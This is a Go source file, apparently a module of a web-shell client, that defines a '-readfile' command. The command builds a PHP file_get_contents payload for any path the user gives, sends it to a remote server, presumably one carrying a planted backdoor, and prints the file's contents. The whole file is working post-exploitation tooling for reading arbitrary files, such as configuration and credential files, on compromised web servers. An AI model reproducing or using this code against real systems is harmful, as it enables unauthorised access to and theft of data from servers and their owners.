package phpmodule

import (
	"errors"

	"github.com/eatbytes/razboy"
	"github.com/eatbytes/razboynik/services/kernel"
)

var Readfileitem = kernel.Item{
	Name: "-readfile",
	Exec: func(l *kernel.Line, config *razboy.Config) kernel.Response {
		var (
			action   string
			file     string
			args     []string
			err      error
			request  *razboy.REQUEST
			response *razboy.RESPONSE
		)

		args = l.GetArg()

		if len(args) < 1 {
			return kernel.Response{Err: errors.New("You should give the path of the file to read")}
		}

		file = args[0]

		action = "$r=file_get_contents('" + file + "');" + razboy.AddAnswer(config.Method, config.Parameter)
		request = razboy.CreateRequest(action, config)
		response, err = razboy.Send(request)

		if err != nil {
			return kernel.Response{Err: err}
		}

		kernel.WriteSuccess(l.GetStdout(), response.GetResult())

		return kernel.Response{Body: response.GetResult()}
	},
}

// func (read *Readfilecmd) GetCompleter() (kernel.CompleterFunction, bool) {
// 	return lister.RemotePHP, true
// }
